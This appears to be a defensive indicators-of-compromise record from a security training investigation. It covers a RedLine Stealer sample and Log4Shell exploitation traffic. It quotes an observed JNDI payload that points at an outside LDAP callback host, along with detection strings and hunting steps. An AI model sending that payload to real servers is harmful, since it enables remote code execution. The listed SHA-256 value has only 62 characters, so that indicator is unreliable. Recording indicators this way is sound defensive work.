# Indicators of Compromise - Day 32

## Purpose
This document records indicators identified during the practical investigations.
The indicators are separated by type and context.
The goal is to make the findings reusable for threat hunting.

## Malware Hash
SHA-256:
`248FCC901AFFE4B4C8C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`

Context:
The hash was associated with the investigated malware sample.
MalwareBazaar identified the sample as RedLine Stealer.
The hash can support endpoint hunting.

## Malware Family
Family:
RedLine Stealer

Classification:
Trojan

Context:
The family identification was supported by MalwareBazaar.
YARA signatures also matched RedLine-related rules.

## Callback IP
Indicator:
`31.131.16.127`

Context:
The address appeared inside a JNDI LDAP expression.
It should be treated as a payload IOC in this observation.

## Callback Port
Indicator:
`1389`

Context:
The port was referenced as the LDAP callback port.
A port alone is not sufficient to classify activity as malicious.

## Payload
Observed string:
`${jndi:ldap://31.131.16.127:1389/Exploit}`

Short detection string:
`${jndi:ldap://`

Context:
The payload is consistent with Log4Shell exploitation activity.

## Source IP 1
Indicator:
`46.105.95.220`

Context:
The source generated HTTP traffic containing the callback address.
The address was observed in the filtered packet results.

## Source IP 2
Indicator:
`104.248.144.120`

Context:
The source generated HTTP traffic containing the callback address.
The address was observed in the filtered packet results.

## Unique Source Count
The investigation identified:
**2 unique source IP addresses**

The addresses were:
`46.105.95.220`
`104.248.144.120`

## ThreatFox Context
ThreatFox was used during malware infrastructure investigation.
The relevant intelligence associated RedLine Stealer with C2 activity.
The intelligence can be used to enrich network investigations.

## YARA Context
Observed rule:
`detect_Redline_Stealer`

The rule supported the malware-family identification.
Other signatures described RedLine payload characteristics.

## Hunting Ideas
Search endpoint telemetry for the SHA-256.
Search proxy logs for the callback IP.
Search firewall logs for outbound port 1389.
Search HTTP logs for `${jndi:ldap://`.
Search PCAP data for the full JNDI expression.
Search DNS records for related infrastructure.
Search process telemetry for RedLine activity.

## IOC Handling
An IOC should always be recorded with context.
The callback IP was observed inside a payload.
It should not automatically be described as the HTTP destination.
The source IPs were packet-level source addresses.
The malware hash identifies a specific file.
The YARA rule identifies a matching pattern.

## Validation
The malware family was supported by multiple intelligence sources.
The network payload was directly observed.
The source addresses were visible in Wireshark.
The callback IP was visible in the HTTP request.
The evidence supports further SOC hunting.

## Incident Response Use
The hash can support endpoint searches.
The source IPs can support network-log searches.
The callback IP can support threat hunting.
The JNDI pattern can support detection engineering.
The LDAP port can support suspicious-egress monitoring.
The malware family can guide behavioral hunting.

## Analyst Caution
Do not block every IOC without validating context.
Do not treat a payload IOC as a packet destination automatically.
Do not treat packet count as unique-host count.
Do not rely on a single vendor verdict.
Correlate indicators with timestamps and affected hosts.
Preserve evidence before destructive remediation.

## IOC Summary
| Type | Indicator | Context |
|---|---|---|
| SHA-256 | `248FCC901AFFE4B4C8C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B` | RedLine sample |
| Malware | RedLine Stealer | Malware family |
| Category | Trojan | Malware classification |
| IP | `31.131.16.127` | LDAP callback |
| Port | `1389` | LDAP callback |
| IP | `46.105.95.220` | Exploit source |
| IP | `104.248.144.120` | Exploit source |
| String | `${jndi:ldap://` | Log4Shell indicator |
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
